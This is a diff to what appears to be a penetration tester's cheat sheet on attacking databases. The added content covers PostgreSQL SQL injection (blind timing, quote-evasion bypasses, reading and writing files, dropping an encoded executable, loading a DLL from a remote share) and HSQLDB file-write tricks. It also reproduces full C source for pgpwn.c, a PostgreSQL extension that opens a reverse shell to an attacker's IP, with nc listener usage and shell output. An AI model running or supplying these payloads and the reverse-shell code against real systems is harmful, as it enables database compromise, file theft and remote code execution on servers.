@@ -93,6 +93,7 @@ select * from MyTable;
 
 ## MySQL
 
+- Online complier: <https://rextester.com/l/mysql_online_compiler>
 - Bruteforce: `hydra -l root -P /path/to/wordlist.txt (TARGET IP ADDRESS) mysql`
 - Connection tests
     ```
@@ -124,6 +125,8 @@ select * from MyTable;
   - connections.log
   - update.log
   - common.log
+- Bypass
+  - Avoid quotes: `select concat('1337','aaaa')` == `select concat(0x31333337,0x61616161)`
 
 ### Privilege Escalation
 
@@ -207,7 +210,164 @@ int main(void)
 gcc -o /tmp/shell /home/npn/shell.c
 chmod +s /tmp/shell
 ```
+## Postgresql
 
+- Online complier: <https://rextester.com/l/postgresql_online_compiler>
+- Ref:
+  - <https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions>
+  - <https://pulsesecurity.co.nz/articles/postgres-sqli>
+  - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution>
+- Docs:
+  - String operations: <https://www.postgresql.org/docs/9.2/functions-string.html>
+  - Lexical structure: <https://www.postgresql.org/docs/9.2/sql-syntax-lexical.html>
+  - Copy: <https://www.postgresql.org/docs/9.2/sql-copy.html>
+  - Large Object: <https://www.postgresql.org/docs/9.2/largeobjects.html>
+- Can do stacked queries (`<query1>;<query2>`)
+  - Returns multiple result-sets
+  - Time based blind: `<injection>; select pg_sleep(10);`
+    - `<injection>; SELECT case when (SELECT current_setting($$is_superuser$$)) = $$on$$ then pg_sleep(10) end;--`
+- `SELECT current_setting('is_superuser');`
+- Base64: `select convert_from(decode('<base64>', 'base64'), 'utf-8');`
+  - Decoding: `SELECT CONVERT_FROM(DECODE(field, 'BASE64'), 'UTF-8') FROM table;`
+  - Encoding: `SELECT ENCODE(CONVERT_TO(field, 'UTF-8'), 'base64') FROM table;`
+- Bypass
+  - Avoid quotes: `SELECT CHR(65) || CHR(65) || CHR(65) || CHR(65);` = `SELECT 'AAAA';` = `SELECT $$AAAA$$;` == `SELECT $TAG$AAAA$TAG$;`
+  - <https://www.postgresql.org/docs/9.4/functions-string.html>
+  - <https://www.postgresql.org/docs/9.4/sql-syntax-lexical.html>
+- File access
+  - Read: `COPY <table_name> from <file_name>`
+    - Read file using SQLI
+    ```sql
+    CREATE temp table test (content text);
+    COPY test from $$c:\test.txt$$;
+
+    SELECT content from test;
+    DROP table test;
+    ```
+  - Write: 
+    - Cannot handle multiple lines
+    - `COPY <table_name> to <file_name>`
+    - `COPY (select $$example$$) to <file_name>`
+    - `COPY (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\example.exe$$;`
+- Load extension: 
+  - `CREATE OR REPLACE FUNCTION test(text, integer) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;`
+  - `CREATE OR REPLACE FUNCTION test(text, integer) RETURNS void AS $$\\192.168.1.2\test\test.dll$$, 'test' LANGUAGE 'C' STRICT;`
+  - `c:\Program Files (x86)\PostgreSQL\9.2\include\server\port\win32_msvc;c:\Program Files (x86)\PostgreSQL\9.2\include\server\port\win32;c:\Program Files (x86)\PostgreSQL\9.2\include\server;c:\Program Files (x86)\PostgreSQL\9.2\include;%(AdditionalIncludeDirectories)`
+- Large object
+  - <https://www.postgresql.org/docs/9.2/static/largeobjects.html>
+  - Read file:
+    - `select lo_import('C:\\Windows\\win.ini', 1234);`
+    - `select loid, pageno from pg_largeobject;`
+    - The amount of data per page is defined to be LOBLKSIZE (which is currently BLCKSZ/4, or typically 2 kB).
+    - `select loid, pageno, encode(data, 'escape') from pg_largeobject;`
+  - Write file:
+    - `update pg_largeobject set data=decode('74657374', 'hex') where loid=1234 and pageno=0;`
+    - `select lo_export(1234, 'C:\\new_win.ini');`
+  - List: `\lo_list`
+  - Delete: `\lo_unlink 1234`
+
+<https://github.com/sourceincite/tools/blob/master/pgpwn.c>
+```c
+/*
+pgpwn.c
+date: 23/11/2016
+Developed by: mr_me
+Synopsis:
+=========
+This code creates a postgres extension that registers a connect_back() function
+allowing an attacker to gain a reverse shell.
+Motivation:
+===========
+A zero-day that runs the postgres user as SYSTEM and whereby I could not gain rce via writing to disk without a reboot.
+Benefits:
+=========
+- No touching disk...
+- Can be loaded from remote...
+Example Usage:
+==============
+1. Register the function:
+-------------------------
+CREATE FUNCTION connect_back(text, integer) RETURNS void
+AS $$\\vmware-host\Shared Folders\research\DemoExtension.dll$$, $$connect_back$$
+LANGUAGE C STRICT;
+That loads the DLL from remote, via a share! ;-)
+2. Execute it:
+--------------
+SELECT connect_back('172.16.175.1', 1234);
+3. On the 'attackers' machine:
+------------------------------
+saturn:~ mr_me$ nc -lv 1234
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+C:\Program Files\PostgreSQL\9.2\data>whoami
+whoami
+nt authority\network service
+C:\Program Files\PostgreSQL\9.2\data>
+4. Now, if you want to remove it, simply: 
+-----------------------------------------
+DROP FUNCTION connect_back(text, integer);
+References:
+===========
+1. http://blog.2ndquadrant.com/compiling-postgresql-extensions-visual-studio-windows/
+License:
+========
+This code is licensed under the Creative Commons Attribution-Non‑Commercial 4.0 International License.
+*/
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include "postgres.h"
+#include <string.h>
+#include "fmgr.h"
+#include "utils/geo_decls.h"
+#include <stdio.h>
+#include <winsock2.h>
+#include "utils/builtins.h"
+#pragma comment(lib, "ws2_32")
+
+#ifdef PG_MODULE_MAGIC
+PG_MODULE_MAGIC;
+#endif
+
+/* Add a prototype marked PGDLLEXPORT */
+PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
+PG_FUNCTION_INFO_V1(connect_back);
+
+WSADATA wsaData;
+SOCKET s1;
+struct sockaddr_in hax;
+char ip_addr[16];
+STARTUPINFO sui;
+PROCESS_INFORMATION pi;
+
+Datum
+connect_back(PG_FUNCTION_ARGS)
+{
+
+    /* convert C string to text pointer */
+    #define GET_TEXT(cstrp) \
+    DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))
+
+    /* convert text pointer to C string */
+    #define GET_STR(textp) \
+    DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
+
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+
+    hax.sin_family = AF_INET;
+    hax.sin_port = htons(PG_GETARG_INT32(1));
+    hax.sin_addr.s_addr = inet_addr(GET_STR(PG_GETARG_TEXT_P(0)));
+
+    WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+
+    memset(&sui, 0, sizeof(sui));
+    sui.cb = sizeof(sui);
+    sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;
+
+    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
+    PG_RETURN_VOID();
+}
+```
 ## Oracle 
 
 ### RCE 
@@ -300,3 +460,25 @@ exec pwn_cmd('cmd.exe /c echo open X.X.X.X > C:\ftp.txt');
 ### References
 
 - <https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573>
+
+## HSQLDB
+
+- <http://hsqldb.org/doc/2.0/guide/sqlroutines-chapt.html#src_jrt_routines>
+- <http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_routines>
+```sql
+CREATE FUNCTION getProperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA
+DETERMINISTIC NO SQL
+EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
+```
+```
+VALUES(getProperty('java.class.path'))
+```
+- `lib/rt.jar` and class path for `public static void \w+\(String`
+```sql
+CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
+LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
+'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
+```
+```
+ call writeBytesToFilename('example.txt', cast ('<HEX>' AS VARBINARY(1024)))
+```
